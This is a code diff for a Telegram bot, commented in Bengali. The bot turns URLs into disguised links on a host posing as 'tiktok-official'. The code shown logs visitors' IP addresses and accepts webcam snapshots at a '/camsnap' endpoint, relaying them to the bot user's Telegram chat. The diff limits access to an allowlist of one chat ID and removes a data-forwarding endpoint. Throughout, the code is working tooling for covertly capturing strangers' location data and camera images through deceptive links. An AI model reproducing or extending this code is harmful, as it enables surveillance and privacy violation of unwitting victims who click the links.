@@ -18,6 +18,11 @@ var hostURL="https://tiktok-official.onrender.com";
 // এই লাইনটি পরিবর্তন করা হয়েছে যেন লিঙ্ক শর্ট না হয়
 var usecodetabs=false;
 
+// অনুমোদিত ব্যবহারকারীদের chatId এখানে যোগ করুন
+const allowedUsers = [
+  6246410156
+];
+
 app.get("/w/:path/:uri",(req,res)=>{
 var ip;
 var d = new Date();
@@ -53,8 +58,15 @@ res.redirect("https://t.me/ehtool");
 bot.on('message', async (msg) => {
 const chatId = msg.chat.id;
 
+// এখানে চেক করা হচ্ছে ব্যবহারকারী অনুমোদিত কিনা
+if (!allowedUsers.includes(chatId)) {
+    bot.sendMessage(chatId, `দুঃখিত, এই বটটি ব্যবহারের জন্য আপনার অনুমতি নেই।`);
+    return; // এটি খুব গুরুত্বপূর্ণ, যেন নিচের কোড আর না চলে
+}
+
+
 if(msg?.reply_to_message?.text=="🌐 আপনার লিঙ্কটি দিন"){
- createLink(chatId,msg.text);
+ createLink(chatId,msg.text);
 }
 
 if(msg.text=="/start"){
@@ -99,9 +111,9 @@ if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https'
 
 var url=cid.toString(36)+'/'+btoa(msg);
 var m={
-  reply_markup:JSON.stringify({
-    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
-  } )
+  reply_markup:JSON.stringify({
+    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
+  } )
 };
 
 var cUrl=`${hostURL}/c/${url}`;
@@ -172,25 +184,8 @@ res.send("Done");
 });
 
 
-app.post("/",(req,res)=>{
-
-var uid=decodeURIComponent(req.body.uid) || null;
-var data=decodeURIComponent(req.body.data)  || null;
-if( uid != null && data != null){
-
-
-data=data.replaceAll("<br>","\n");
-
-bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});
-
-
-res.send("Done");
-}
-});
-
-
 app.post("/camsnap",(req,res)=>{
-var uid=decodeURIComponent(req.body.uid)  || null;
+var uid=decodeURIComponent(req.body.uid)  || null;
 var img=decodeURIComponent(req.body.img) || null;
 
 if( uid != null && img != null){
